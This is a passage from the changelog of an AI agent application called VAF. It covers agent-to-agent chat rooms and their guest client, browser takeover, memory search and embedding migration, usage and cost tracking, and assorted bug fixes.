  often unsafe - commands piped into a shell, embedded credentials, hidden
  characters used to smuggle instructions. Anything found is noted next to the
  file and on the dashboard, and the file is delivered as normal. Legitimate
  scripts do these things too, so this is information, not a refusal.

### Changed
- **The Telegram and WhatsApp dashboards show the conversation inline.**
  Selecting a chat now shows the actual conversation (user and bot bubbles,
  oldest at the top, auto-scrolled to the newest message) directly in the
  dashboard instead of a short "Incoming/Outgoing" list that needed a click to
  open a popup; the separate history popup is gone. Internal `<think>` blocks
  are stripped from this view since they are never sent to the channel. A
  search field on the conversation header works like Ctrl+F over the chat:
  matches are highlighted, Enter / Shift+Enter (or the arrow buttons) jump
  between them, Escape clears the search. The Memory Learning progress line
  now sits in the conversation header next to the title. The panel grows to fill the window height,
  so the Full access / Relay contacts panels sit at the bottom instead of
  floating above empty space. In the Telegram dashboard the "Open in Telegram"
  link moved into the dialog header next to the title, freeing the former
  "Chat with bot" block's space for the chart and the conversation.
- **The soul's Continuity section now names the agent's real memory lane.**
  The default soul text (the onboarding wizard's suggestions and the fallback
  soul) told the agent to "read your memory files" - but the agent's long-term
  memory is not a file, it is its tools. The text now says exactly that:
  recall with `memory_search` before asking or guessing, persist what matters
  with `memory_save`, because a fact that was never saved is gone next
  session. Existing souls are not rewritten; the wording changes for new
  setups and for anyone re-running the Soul Wizard. The lane also no longer
  depends on the soul's text at all: the system prompt appends a short,
  fixed continuity note to the personality section that cannot be edited or
  removed with the soul, so an agent whose soul never mentions memory still
  knows its memory tools.
- **"Train tool now" asks before it starts, and says what the run costs.** The
  button used to begin training the moment it was clicked, with nothing said
  about what that means. It now asks first, and the question states what was
  measured: training runs the tool for real dozens of times and makes dozens of
  model calls to learn from the results, and those calls count towards usage
  like any other; a run cannot be stopped once it has started and has no time
  limit; and if it is interrupted, the tool falls back to "Learning" until it is
  trained again. The safe answer carries the emphasis, because it is the one
  that costs nothing. What training does not do is hold anything else up: the
  agent, automations and other runs carry on beside it, and the only thing
  refused while a run is in flight is a second run of the same tool. Tools whose
  effect cannot be taken back - anything that sends a message - are never run
  during training at all.

### Fixed
- **"Take over" now means take over, not start over.** Asking the agent to
  take over while you are browsing hands it your actual session: the run is
  told which page you were on and continues there - your tab stays open, your
  logins stay live - instead of opening the site again in a tab of its own.
  A takeover run also no longer wipes the session it was handed, even when it
  would normally start with a clean browser. The way back mirrors it: whether
  the run finishes, fails or is stopped, you get the browser back exactly as
  the agent left it - tabs included - instead of a blanked window, with the
  same handover animation in both directions.
- **Closing the side panel finally plays its animation.** If the panel's
  width had ever been adjusted by dragging its edge (the choice is
  remembered), every close snapped shut instantly instead of sliding: the
  dragged state carried an unbounded CSS max-width, and `none` cannot animate
  to the closed state's zero, so the browser clamped the width to nothing on
  the spot (measured: closed at 60ms of a 300ms transition). The cap is now a
  finite value that never binds, and the window keeps its content painted
  while the panel closes over it - the close is the open, played backwards.
- **A browser window you opened yourself never closes itself again.** Opening
  the browser by hand now marks the window as yours until you close it: an
  agent run may still borrow the browser, but afterwards - whether the run
  succeeded, failed with a browser error, or was stopped - the window returns
  to your interactive session instead of auto-closing. Previously the mark was
  shared with every worker view and got reset the moment agent data streamed,
  so a failed takeover could close the browser over the error it caused.
- **The agent's browser view is the same window you drive.** One browser, two
  modes: in agent mode the window keeps the exact frame of the interactive
  browser (header, viewport, status bar) and adds the Task, Activity and
  History panels beneath the viewport. The rebuilt tab strip and address bar
  are gone - the live stream shows Chromium's real UI, and where only
  screenshots exist (workflow runs) they appear on the same surface.
- **An automation's saved file now follows its message to the messenger.** A
  prompt-based automation that sends its summary itself in-run (say, a morning
  weather text via Telegram) produces its output file only after the run, so
  that message could never carry the file - and the post-run push, the only
  lane that attaches it, was skipped entirely by the double-delivery guard.
  The guard now suppresses only the duplicate text: the produced file is still
  handed over as a follow-up document with a filename caption, on Telegram,
  WhatsApp and Discord alike. Workflow runs whose send step already attached
  the document stay at one copy - the second send is recognized and skipped.
- **The interactive browser looks and behaves like a browser now.** The window
  is a real browser, with its own tab strip, address bar, bookmarks and
  downloads, themed dark to match the app - so everything a browser can do is
  there rather than a rebuilt fraction of it. The page fills the window instead
  of sitting in black bars, and the sub-window with Task, Actions, History and
  Activity stays away while you are driving, returning when the agent takes
  over. Opening it shows VAF's own quiet loading state until the picture is
  really there, rather than the stream viewer's foreign splash. Several smaller
  repairs went with it: streams no longer die after exactly 40 seconds of
  reading, scrolling no longer smears the page, and closing and re-opening the
  browser no longer leaves a second browser UI inside the window.
- **The interactive browser window now actually shows the browser.** It fetched
  its viewer correctly and then stayed blank, because the server sends
  `X-Frame-Options: DENY` on every response and the window is a frame - so the
  browser downloaded the page and refused to paint it. That header is now
  `SAMEORIGIN` for the stream path only, which is the one page meant to be
  framed, and only by VAF's own UI. Two more defects on the same lane went with
  it: the viewer's address is no longer built with a guessed `http://`, which
  was wrong whenever LAN hosting with TLS is on (the backend port speaks HTTPS
  then and answered nothing), and the stream reaches LAN users at all now - the
  HTTPS proxy had no websocket route for it and its relay could only carry text
  frames, while a browser stream is binary from the first byte.
- **Quickly restarting VAF no longer leaves the Docker services dead.** Quitting
  VAF stops the Docker stack in a background thread with up to 25 seconds of
  headroom; stopping and restarting VAF inside that window raced the old
  instance's stop against the new instance's startup, and the stop won - the
  new VAF ran with every container down (memory search empty, browser gone)
  until someone noticed. The stop now checks the containers' own start time
  first: restarted after the shutdown began means a new instance owns the
  stack, and the old stop stands down.
- **The tool self-learning loop no longer goes quiet for the tools you use
  most.** Three repairs in the Whare Wananga lane. A tool whose definition
  changed (marked stale) was excluded from the proactive pitfall injection AND
  refused new lessons from live errors, so the agent repeated mistakes the
  system had already seen - stale records now keep learning from runtime
  surprises while their retraining is still owed. The known-pitfall matcher
  saw a real failure as novel although the record's first pitfall described
  exactly that trap, because most of the error's words were VAF's own error
  wrapping - the matcher now strips that wrapping and recognizes
  argument-contract errors by the argument they name. And the learning events
  are finally visible: a re-fed know-how, a newly learned pitfall, and
  know-how going stale (with how to retrain) now appear in the log timeline
  instead of only in a debug file nobody reads.
- **Nothing a tool learned from real use is silently forgotten anymore.** Two
  quiet loss lanes: when a tool's pitfall list was full, the newest lesson -
  the one just learned from a live failure - was the entry that got dropped;
  and a retraining run started all knowledge baskets empty, wiping the
  lessons learned from real incidents along with the retrainable ones. Now
  the cap evicts by replaceability (entries a training run can re-derive go
  first, live-incident lessons only as a last resort, the newest lesson is
  always kept), and a retraining run carries the live-incident lessons over
  and re-attaches them after every distillation pass. Every eviction and
  every carry-over is logged.
- **A thinking turn with a text-recovered tool call no longer dies with a
  Veyllo 400.** Some models occasionally write a tool call as text instead of
  a structured call; VAF recovers those and, for Veyllo, replays them as plain
  context because the gateway refuses tool-call ids it did not issue itself.
  That replay rebuilt the assistant message from its text alone and dropped
  the model's reasoning - and Veyllo's thinking mode, which knows the turn had
  reasoning, rejected the whole request ("The reasoning_content in the
  thinking mode must be passed back"). The rebuilt message now carries the
  reasoning when there is any and survives even when thinking was all the
  model said; a turn that never reasoned sends no such field, and none is
  demanded.
- **The agent's avatar stays in one piece while it works in a chat's action
  timeline.** During a tool call the timeline's walking dot used to switch to
  the wide tool scene built for the free-standing loading bubble - a magnifier
  and particles more than a hundred pixels wide, in a gutter that has the tool
  cards directly to its right. The scene was clipped under the cards and its
  layout lean pushed the dot far off its rail, so the reader saw scattered
  fragments (a stray dot here, a lens handle there) instead of an agent. The
  timeline now keeps the plain living dot on the rail, the way it was designed;
  a running web search shows as the figure's own looking-around motion and
  other tools as its working pulse. The same fallback also animates the mobile
  avatar during tool calls, which used to freeze to a still dot there.
- **Each chat now keeps its own working state; switching no longer bleeds one
  chat into another.** With the agent busy in one chat, opening another showed
  that chat's stop button too, and coming back to the first could leave its
  loader, stop button and tool animation running forever with nothing left to
  clear them. Three causes, all fixed: the sub-agent window, the workflow panel
  and the stop-press feedback lived in state shared by every chat and now
  belong to the chat they came from (the sub-agent view is swapped per chat
  like the messages, the workflow panel records which chat its run belongs to
  and only appears there); the events that end a turn used to be thrown away
  when they raced a chat switch, so a chat could never learn its turn had
  finished - they are kept for bookkeeping now, and a chat that finishes in
  the background shows an unread mark instead of a sound; and the server's own
  "is this chat busy" answer was read from one process-wide status field that
  parallel workers overwrite, so it now comes from the task queue, which knows
  it per chat. A worker display whose updates stop arriving settles itself
  after 30 seconds instead of claiming a running task forever, and a failed
  turn now tells the browser it is over instead of leaving the stop button
  armed.
- **Reading a large file no longer cuts it off blind.** Every tool result in
  the chat used to be capped at 2,000 characters, and a file read hit that wall
  with nothing to go on: no length, no line count, no way to ask for the rest.
  A YouTube summary of 2,781 characters arrived cut, and reading a long report
  meant guessing ever-smaller page ranges. File reads are now exempt from that
  generic cap and budget themselves instead: a large text file returns its
  first section together with the facts (how many lines and characters it has,
  which lines are shown, how to continue with `start_line`/`end_line`) and a
  structure index, a list of the file's headings with their line numbers, so
  the agent can jump straight to the part it needs, the same way PDFs already
  read by page range. Word, Excel and PowerPoint reads share one honest
  ceiling that names what was left out instead of a bare "(truncated)".
- **A background bookkeeping task could kill the tool spinner, silently.** Every
  30 seconds a debug profiler counted all objects in memory to watch for leaks.
  That census briefly touches objects other threads are still in the middle of
  building, which is a way to make Python abort whichever thread is building
  them (CPython issue `bpo-15108`). In practice the victim was the terminal
  spinner shown during a tool call: it froze mid-run with no error anywhere but
  the terminal's own error stream. The census is gone; the profiler still logs
  memory usage and its growth warnings, which is what the log line is for. And
  because that crash left no trace in any log file, uncaught errors from
  background threads are now written to `crash_<date>.log` on every lane the
  app starts, always, regardless of the debug-logs switch. Embedders get the
  same via `vaf.install_thread_excepthook()`.
- **Deleting a chat cannot skip its confirmation any more.** The trash icon in
  the sidebar deletes a chat that is genuinely empty without asking, which is
  right: there is nothing to decide about a chat nobody used. Whether it was
  empty, though, was judged in the browser from a number that arrives with the
  session list and is refreshed by nothing a conversation does, so a chat that
  filled up while the list stood still still counted as empty and was deleted on
  one click, with no dialog and no copy kept. The browser no longer decides
  this. It asks, and VAF answers from the chat itself: a chat holding messages,
  an attached document or a file in its folder always brings up the dialog
  first. The same question is now asked everywhere a chat can be removed, so a
  cleanup started from the terminal cannot quietly delete what the app just
  refused to delete, and a chat that only holds an automation result or a
  proactive question the user has not answered yet counts as worth keeping.
  Keeping a copy in the archive is offered afresh every time the dialog opens.

- **A rejected mail login now says what to do about it.** Connecting a GMX
  account with two-factor authentication switched on failed with nothing but
  "authentication failed", which named no action: IMAP has no step where a
  six-digit code can be entered, so the mailbox password can never work once
  2FA is on, and GMX additionally ships POP3/IMAP access switched off. VAF now
  answers a refused login with what that provider actually needs - an
  app-specific password, a separate mail-program password, a sign-in instead of
  a password, or a local bridge - whether IMAP has to be switched on first, and
  a link to the provider's own page for it, in the language of the interface.
  An unknown provider gets the general advice rather than nothing. Guidance
  appears only when the server refused the login, so a name-resolution failure
  is no longer answered with password advice. An address with no known server
  and no host typed in is now refused with that instruction instead of being
  quietly tried against Gmail's servers.
- **Sending a room message no longer shows it twice.** The pending copy was
  matched against the delivered message by exact text, but the server trims
  what it stores - one trailing space (a phone's autocomplete) and the copy
  stood under its own delivered message for 30 seconds. The comparison is
  trimmed on both sides now. The pending copy also looks like the message it
  is about to become - your initials, name and text, dimmed, a light band
  sweeping while it sends, a small "sending" note - and on delivery the
  message blends up in place instead of drifting in as if it were new.
- **The room no longer draws a "VAF is typing" row.** Whether the agent has
  seen a message is what the read receipts under it already say; the extra
  presence row said the same thing a second time, sitting exactly where the
  answer was about to land. A human member typing keeps the small dots bubble.
- **A room's shared folder lists the same paths on every OS.** On a Windows
  host, the seat-authenticated file listing (and the push answer) rendered
  relative paths with backslashes, so a file pushed as `sub/a.bin` came back
  as `sub\a.bin` - a name the fetch endpoint on another machine would then
  miss. Paths on the wire are POSIX now, whatever the host runs on.
- **The update dialog now knows how the update ended.** Updating from
  Settings -> Update and Repair used to show a spinner for as long as ten
  minutes with no verdict: the dialog watched the version only through the web
  interface, which is down for its own rebuild for minutes after the backend
  is already back, and a failed update that rolled itself back looked exactly
  like nothing ever happened. Now every `vaf update` run records how it ended
  (`~/.vaf/update_result.json`), the dialog reads that verdict and shows a real
  failure screen (rolled back, recovery needed, or aborted before anything
  changed) with the error and the log path - and while the interface is still
  rebuilding it asks the backend directly, so a successful update says "server
  updated, interface rebuilding" instead of spinning blind.

### Added
- **A file in the room can be named, not just described.** A message may now
  carry `files` - the names of files in the room's shared folder it is about -
  so a receiving agent sees machine-readably what was left for it instead of
  having to find the filename inside a sentence. It works the same way
  everywhere, which is the point: the agent's `room_send` takes `files`, the
  CLI's `say`, `answer` and `report` take `--file`, the guest client takes
  `--file` (and its MCP tools a `files` argument), the browser draws a chip
  under the message, and the agent's own room turn names the file in its
  prompt. References are read defensively in one place: an absolute path or a
  traversal is dropped rather than rendered.
- **A guest in MCP mode holds its room open.** An MCP server is one
  long-lived process, so the guest client now keeps each joined room's
  connection open instead of dialling per tool call: the writer lease is
  renewed from there, what the room says is mirrored as it arrives, reads
  answer from that mirror without a connection at all, and sends ride the same
  line - the collision a per-call send and a held wait used to produce cannot
  happen any more. A wait is instant when something is already there and safe
  to leave running. Shell verbs are unchanged: one process per command has
  nothing to hold a line with. Nothing here is a push, and the protocol
  document says so: no harness wakes an idle model, so an agent still has to
  ask - asking is just cheap now.
- **An agent in MCP mode is told when a room is waiting.** Every tool answer
  now carries a line naming rooms with unread messages, even for tools that
  have nothing to do with them. No harness wakes an idle model, so the moment
  it is already reading an answer is the only moment it can be told - and this
  costs nothing, since the held line has the messages anyway and counting them
  does not consume them.
- **The guest client can refetch itself, verified.** `update` pulls the host's
  current client over the authority the guest already pinned, so nobody has to
  hand-type a `curl -k` again: full certificate verification, no checksum to
  copy, and the download is compiled before it replaces anything, because a
  truncated file would break the one command that could fetch a new one.
- **A room invitation now fits an MCP host.** The downloadable guest client
  grew an `mcp` subcommand: `python3 a2a_client.py mcp` is a stdio MCP server,
  so Claude Desktop, Claude Code or Cursor get the room verbs as `a2a_` tools
  from the same single file - standard library only, same checksum lane, same
  seats. The invitation's guest section carries the ready-to-paste host
  config, `rooms` and `howto` work from the shell too, and the join keeps the
  room's welcome so `howto` can reprint what the room said about itself.
- **A room's shared folder is reachable from another machine.** A remote seat
  holder could talk about files but never exchange them - the workspace is a
  folder on the host. The guest client gains `files`, `fetch` and `push` (and
  the matching `a2a_files` / `a2a_fetch` / `a2a_push` MCP tools), speaking to
  three seat-authenticated endpoints on the host. Uploads are capped, paths
  are contained to the workspace (traversal and symlink escapes refused), and
  deleting over the wire deliberately does not exist - destruction stays with
  the members on the machine that owns the folder.
- **Loading shows the shape of what is coming.** While a chat's history or a
  clicked group chat's transcript loads, the message area shows skeleton
  bubbles under a thin progress bar that races to two thirds and then creeps -
  both vanish the moment real messages arrive, instead of a spinner over a
  blank area. A message sent into a group chat appears immediately as a
  visibly pending bubble ("wird gesendet…") and is reconciled against the
  room's store, which alone decides the order of a room with many writers.

### Fixed
- **Tool results that ARE the deliverable are no longer cut mid-artifact.** The
  dispatch funnel caps every tool result at 2000 characters to protect the
  model's context - a good default with one measured failure mode: a loaded
  skill body was cut mid-instruction, and a room invitation briefing was cut
  inside the very block the result orders the agent to pass on "unchanged and
  complete". The agent then correctly refused to hand over the torn half and
  spent a whole turn hunting the rest in encrypted stores and capped logs,
  until the model collapsed into raw markup. Tools can now declare
  `result_is_deliverable` and reach the model whole; `use_skill`, `read_skill`
  and `room_invite` do, each keeping its own output bounded in exchange. The
  declaration is honored along the whole path, not only at the funnel: the
  in-history compression stage no longer prunes such results (it had become the
  new cut once the funnel stepped aside), and the error classifier no longer
  paints a briefing as failed for containing the words "failed" and "tool" in
  its own vocabulary - which had marked perfectly successful skill loads and
  invitations as errors on the step chips.
- **A half-opened room connection can no longer mute the whole room.** When a
  remote client vanished between taking the writer lease and receiving the
  welcome (a timed-out dialer hanging up), the server never released the
  lease - so the client's own reconnects were refused for the full 90 second
  lease lifetime, and every half-successful retry armed another dead lease.
  The room read as permanently dead while the server printed a traceback per
  attempt. The lease is now released on every exit path, and the handshake's
  store work runs off the shared event loop, so a remote connect storm no
  longer stalls the WebUI socket beside it.
- **Leaving a group chat no longer bounces back into it.** The room view's
  3-second refresh could have one answer still in flight when the person
  switched to a normal chat; that late answer re-opened the room seconds
  later, over and over on a slow server. A transcript now only opens the view
  when it answers the person's own click, or refreshes the room already on
  screen. A room message typed while the connection is down also stays in the
  input box now instead of being silently dropped with a cleared box.
- **A held room session keeps its write right.** The server renewed a remote
  connection's writer lease only after a successful send, so a session that
  read and thought for longer than the 90 second lease lost the right to speak
  while staying connected and receiving - and a conversation is exactly
  read-think-answer. Found by the first foreign agent to hold a session (a
  Claude agent on another machine driving the VAF CLI). The wire gains a
  `renew` transport verb, the session daemon sends it every 30 seconds, and a
  host too old to know the verb is asked exactly once. Protocol contract C9
  ("leases are renewed while attached") is now true.
- **The session outbox no longer counts refused messages as sent.** An answer
  of `not_writer` deleted the payload and counted `sent: 1` - a rejected
  message that read as delivered. The room's answer now decides the file's
  fate: committed sends leave, an unauthorized send stays for the next round,
  and a judged refusal moves aside with the room's answer beside it, counted
  as `rejected`.
- **The downloadable guest client holds a line without losing it.** The
  single-file client a host serves (`/api/a2a/client.py`) now keeps its writer
  lease alive during a long `wait` with the `renew` transport verb (asking a
  host that predates the verb exactly once), exposes `RoomConnection.renew()`
  for guests holding a line of their own, and no longer drops frames that
  arrive while it awaits an ack for its own send - a message somebody sent in
  that window was silently never seen. A guest gets all of this by simply
  re-downloading the client from the host.
- **`vaf a2a mission` and `vaf a2a introduce` stop denying remote rooms.**
  Both answered "there is no room on this machine" for a room the caller holds
  a seat in. Mission now reads from the join handshake (labeled as of joining)
  and refuses a remote write with the way that works; introduce names the
  path that works today (say it in the room) instead of denying the room.
- **An agent enters a room under its own name.** When the model passed no
  display name, room_open and room_join seated the agent as "VAF" - the product,
  not the persona its user had named - while every other surface (greeting,
  system prompt, TUI title) already used the persona name. Both tools now
  resolve the agent's own name through one shared resolver, the way an agent
  card is meant to present the agent's identity; an explicit display still wins,
  and "VAF" remains only the last resort when no persona is resolvable.
- **Veyllo no longer rejects the empty-response retry.** Veyllo speaks
  DeepSeek's thinking dialect and demands that a replayed assistant message
  carry its reasoning as a separate field; VAF restored that field for DeepSeek
  only, so the first lane that rebuilds and resends history - the
  empty-response retry - died with a 400 instead of recovering the turn. The
  restore now covers the family.
- **A group chat no longer shows phantom notifications.** The sidebar's unread
  badge counted the room's own check-in pings, which the transcript view
  deliberately never shows - so the dot lit up, the room had nothing new, and
  the dot came back with the next check-in. The badge now counts exactly what
  the view would show. The check-in interval itself is also derived from the
  room's log now instead of process memory, so restarting the app no longer
  re-asks every idle member within seconds (on a day of live restarts, a
  quarter of a busy room's frames had become check-ins).
- **A reply that is only an unclosed thinking block counts as empty again.**
  When a model opens a `<think>` block and never returns from it, the block's
  prose used to pass the empty-response check as if it were the answer - so the
  retry that replaces a dead generation never fired and the user saw leaked
  markup where a reply should be. Thinking now counts as thinking whether the
  model closed the block or not, in both empty checks (which share one probe
  now instead of two hand copies).
- **Memory search stopped throwing away most of its own candidates.** Two
  retrieval defects capped answer quality regardless of the embedding model.
  The vector lane handed the rank fusion only its top 5 candidates while the
  keyword lane handed 20, so a correct memory ranked sixth by the vector side
  never even reached the fusion; both lanes now feed the same depth. And the
  keyword lane scanned only the first 400 stored chunks in no particular
  order, silently ignoring the rest of a larger store; the cap is now 2000,
  and existing installations that carry the old value in their config are
  lifted by a config migration (a deliberately customized value is kept). On
  the golden-question set this took first-hit accuracy from 12/26 to 18/26.
- **Memory search knows which model wrote each vector.** Every stored memory
  and chunk now records the embedding model that produced its vector. Two
  models can emit same-sized vectors that are mutually meaningless, and until
  now nothing could tell such a mixed store from a healthy one - search would
  just quietly get worse. Existing rows are stamped on the next start. The
  embedding caches include the model in their identity for the same reason,
  editing a memory no longer writes an unencrypted content preview back into
  its metadata (re-introducing a leak that was already cleaned up), and an
  edited memory's summary vector is computed from the content again instead
  of from its deliberately content-free title.
- **A model that asks for four files now gets four, not one.** When a model
  writes its tool calls as text instead of using the structured field - which
  DeepSeek does intermittently, emitting several calls inside one wrapper - VAF
  recovered only the first and then removed the rest from the visible text while
  cleaning up. The result was a reply that read normally, one file actually
  read, three quietly skipped, and nothing anywhere saying so. All calls in such
  a batch are recovered now. A batch entry naming a tool that does not exist is
  skipped on its own rather than cancelling the real calls beside it.

### Changed
- **Memory understands more languages.** The default embedding model for
  long-term memory is now `intfloat/multilingual-e5-small` (100+ languages)
  instead of the English-centric MiniLM: a question asked in German now finds
  facts that were stored in English, and the other way round. Existing
  installations are migrated automatically in the background on the next
  start, with a progress banner in the app and a status line in the terminal;
  until the migration finishes, search keeps working on the previous model.

### Added
- **Archived chats look like an archive.** They are shown as boxes in a grid
  instead of list rows; hovering lifts a box and opens its lid. Opening one now
  has a readable way back - the old link was grey on near-black - and a Delete
  from archive action next to it. Deleting there is final and the dialog says
  what that means: it is the last copy, and the agent can no longer recall the
  conversation afterwards.
- **The memory store can move to a new embedding model without losing anyone's
  data.** `vaf memory reembed` re-embeds every stored memory and chunk whose
  vector was written by another model - resumable, idempotent, nothing is
  deleted, and rows the encryption key cannot open are set aside instead of
  blocking the run. The app start does this automatically when the configured
  model and the stored vectors diverge, in a background worker process; until
  the store is fully migrated, search keeps using the model the vectors were
  written with, so results never come from a half-converted store.
- **Deleting a chat asks first.** The trash icon opened no dialog at all: one
  mis-click removed a conversation and its attachments for good. It now opens
  the same kind of confirmation the group chats already had, naming the
  documents that go with it, and the confirm button is disarmed for three
  seconds - a closed padlock and a count, opening to an unlocked one and the
  wording when it is safe to press. A destructive button under the cursor is
  pressed before the sentence above it is read. That delay now guards the
  group-chat dialog too. The same dialog offers to keep a copy in your archive
  instead of losing the conversation, ticked by default - the usual regret is a
  chat deleted for tidiness that the agent later needed. Archived chats stay
  readable by everything that reads a chat, so the agent's memory can use them,
  and they are private to your account. An empty chat - no messages, no
  attachments - is still deleted with one click: there is nothing to lose,
  so there is nothing to confirm. Archived chats have their own window:
  **Settings -> Persona & Memory -> Archive**, with the search and its hits
  on the left and the chats on the right; opening a hit jumps to the message
  it was found in, with every match highlighted. The search runs on the
  server across all your archived chats - it no longer needs you to open the
  right one first - and it finds things the same way the agent does, so
  "Reisekosten" finds "Reisekostenabrechnung" and "Pruefung" finds
  "Prüfung". What matched is highlighted in the result list and in the chat
  itself, so a hit shows you the words it found rather than only the chat -
  and it outlines the whole passage the agent would receive for that hit, so
  you can see exactly what the model gets. Archived chats also stay available to the agent's memory:
  Cross Chat Hints read them like any other chat of yours, which is what the
  "keep a copy" option promises.
- **Settings -> Usage: what was actually consumed, and by whom.** A new tab
  showing total tokens, request count, an estimated cost, and a table of
  accounts with the heaviest first. The token numbers do not depend on anyone
  agreeing about tokenizers: each one is what the provider itself reported for
  a call it billed, so providers that count differently still add up to the
  invoice. The cost next to them is the single estimate on the page - it comes
  from a price list that ages, and a model missing from that list is priced at
  the expensive end and marked as an upper bound. Everyone can open the tab,
  but only an admin sees costs and other accounts. Everyone else sees their
  own tokens and requests - no money, no percentage of the total, nothing
  about anyone else - and that is stripped from the response itself rather
  than hidden in the page. The chat's Context Window header now has a Usage
  button that opens this tab directly. Clicking a bar in the 7-day chart
  opens that day's breakdown: which lane spent the tokens - chat, thinking,
  automation, a sub-agent, the browser - and how much each one used.
  Token counts were also running low against the providers' own dashboards:
  a call whose token counts happened to match the previous one exactly was
  treated as "nothing new" and dropped, and the utility lanes send nearly
  identical prompts back to back. Calls are now measured as the growth of
  the running total, so identical repeats count. A call the provider never
  reports usage for - an aborted or failed stream - is no longer silently
  missing either: it is counted, sized by a rough word count, and marked as
  an estimate, so the part of the total that was estimated can be seen and
  subtracted.
  Coverage is complete now: individual tools bill under their own name, the
  coder's own connection is counted, and local model calls are counted too -
  they cost nothing, but leaving them out meant the page could not answer
  what the machine actually did. Amounts also show the right currency: Veyllo
  bills in euros and the other providers in dollars, so the figures were
  euros wearing a dollar sign. Each call now records the unit it was priced
  in, and a period spanning two providers shows both amounts instead of
  adding them together. Spending recorded before that change is still shown,
  marked as being of unknown currency rather than dropped or assumed. A
  EUR/USD toggle converts the figures at the European Central Bank's daily
  reference rate, showing the rate, its date and its source beside them; it
  changes the view only, never what was recorded, and it stays hidden when
  no rate is available. The choice is remembered, and it applies to the price
  comparison as well, so the whole tab can be read in one currency. Spending recorded before currencies were stored can
  be attributed once, by stating which currency it was - the software will
  not guess, and it backs the ledger up before touching it. Both live in a
  new `vaf usage` command as well (`show`, `set-currency`), so an install
  without a browser can read the same figures and run the same action. And a new breakdown shows which provider and model
  did the work - chat, vision, sub-agents, the tool model and the thinker can
  each run somewhere else, or locally, and their prices differ by an order of
  magnitude, so the total alone said very little. The XML export carries all
  of it - period, per day, per lane, per provider and model, each amount in
  its own currency - and opens with a plainly written note saying the money
  is an estimate and how it was arrived at.
  Local models contribute tokens and no cost.
  The tab also carries a 7-day bar chart with the busiest day marked, a share
  bar per account (percentage, requests, tokens), a panel pricing the same
  tokens against every provider's public list price - tap one to see which
  model and rates the figure used, or define your own price in the last row -
  and an XML export of the last 30 days that states in prose how each number
  was measured. The comparison quotes each provider at its cheapest model for
  the usage in question, opens a dialog with that provider's full model list
  and per-model figures when tapped, and reports currency rather than
  converting it (Veyllo publishes EUR, the others USD). Both dates are stated
  rather than left to be guessed: which period the compared tokens come from,
  and when the price list was last checked against the providers' own pages.
  Requests recorded before token counting existed are now labelled as such
  instead of showing a bare zero.
- The Settings window is slightly larger, so the new tab is not cramped.

### Security
- Dependency updates (Dependabot, both npm trees): Next.js 16.2.11 to 16.3.0,
  whose vendored lodash closes CVE-2025-13465, with eslint-config-next in sync;
  monaco-editor 0.56.0, next-intl 4.13.6, mammoth 1.12.1, zustand 5.0.15 and
  autoprefixer 10.5.4 ride in the same group. The WhatsApp bridge moves to
  Baileys 6.7.24, which mainly refreshes the pinned WhatsApp Web version. The
  dompurify override stays required: monaco-editor 0.56.0 still pins an old
  copy. Next.js now requires sharp 0.35 itself, so the sharp override has
  become redundant and can go with the next dependency pass.

### Changed
- **Every model call is counted now, not just the chat.** Usage was recorded at
  the end of a chat turn, so the coder, sub-agents, vision, voice, memory
  compaction, the mail composer and the browser agent all reached a model by
  other routes and spent invisibly - the Usage tab and the daily spend cap were
  both reading a fraction of the real total. Recording moved into the one
  method every lane passes through, so completeness no longer depends on nine
  places remembering to ask. Each call is also written to a new
  `usage_YYYY-MM-DD.log` with its lane, model, tokens and cost, which is the
  fastest way to see what a single sub-agent or coder run consumed. That log is
  a copy for reading, never the source: the per-user ledger stays the record,
  so deleting logs cannot lose history. It is the one log that ignores the
  debug-logging switch, because a spend record that can be switched off is not
  a record. Each lane names itself in that log - `memory`, `vision`, `voice`, `librarian`, `mail`, `browser`, `thinking`, `main` - so it answers which part
  of the product spent the tokens - including the lanes that run while nobody
  is watching: `automation`, `thinking`, `subagent`, `room` and `background`
  are named rather than billed as if a person had typed them. The Usage tab
  also gained a Refresh button,
  and the price comparison now shows the arithmetic behind its figures -
  sent plus received equals the instance total - so the number it prices
  cannot be mistaken for one account's.
- **The API price table is current again** (checked 2026-08-17 against the
  providers' own pricing pages). It had been carrying a previous model
  generation, which made every cost estimate in the product wrong in both
  directions. Model names from the older generation keep their prices, so
  existing ledgers are not silently repriced at the unknown-model rate.
- **"Context effort": choose what a reply is allowed to cost.** Settings -> AI
  & Model now carries a stepped slider from 8,000 tokens up to whatever the
  configured model's real context window is - seven positions on a 128k model,
  four on a 32k local one, always ending at the model's true maximum. It sets
  the budget the compression lane triggers on, and the number it shows is the
  honest one: an API is sent the entire conversation again on every reply and
  bills every token, so the setting is the price of one reply rather than a
  capacity. The default moved from 30,000 to 45,000 tokens. Moving it down
  deletes nothing - older turns are summarized, and the full history stays
  recoverable with `/restore`. The same ladder is in the terminal under
  Settings -> Context -> Context effort, and embedders get it from
  `resolve_context_effort()`. For a local model the slider is disabled with a
  note, because local tokens are free and the budget is ignored there.

### Fixed
- **API costs no longer grow without bound in long chats.** On a pay-per-token
  provider every reply resends the whole conversation, and compression only
  fired at 85% of the 128k model window - a three-week chat sat at ~65k tokens
  forever, so even a one-line question paid ~65k tokens again, in every single
  round-trip. Compression now triggers at a cost budget (`context_compress_tokens`,
  default 30,000 tokens; `0` restores the old window-based behavior), posts a
  visible system message with the before/after counts, and local models are
  unaffected. Two bugs in the same lane went with it: the agent kept two
  separate context managers, so a `checkpoint_context` summary was stored on an
  object the session never persisted; and loading a session (or restarting the
  app) replayed the full transcript back into the context, silently undoing
  every checkpoint. One manager remains, its state persists, and a loaded
  session is compressed again on arrival, reusing the saved summary without an
  extra LLM call.

### Changed
- **Reading a group chat no longer shows as typing; it shows as a read receipt.**
  The three bouncing dots used to appear for any member that had merely read the
  newest message, for up to two minutes - an agent that only monitors its room
  looked permanently busy. The dots now mean composing and nothing else: the
  agent is really writing an answer, or a person is pressing keys in the input
  box. Reading shows as small stacked profile circles under the last message
  each member has read, moving down as they read on, capped at twenty faces
  with the remainder as a number.

## [0.1.0a23] - 2026-08-16

### Added
- **A harness with no VAF at all can join a room now.** Every invitation with a
  wire endpoint carries a section for exactly that guest: the room host serves
  a single-file client (`/api/a2a/client.py`, Python standard library only, no
  install) together with its authority (`/api/a2a/ca.pem`), and the invitation
  itself carries the file's sha256 and the CA fingerprint - checking those two
  numbers is what makes the unverified downloads safe. The client pins the
  authority, redeems the ticket, keeps the seat, and speaks `join`, `read`,
  `wait`, `say`, `answer`, `report` and `leave`. It lives in the repository as
  `examples/12_a2a_wire_peer.py`, imports nothing from VAF, and is tested
  against an independent WebSocket implementation - so the protocol's claim
  that the document alone is enough to build from now covers the transport,
  not only the rules.
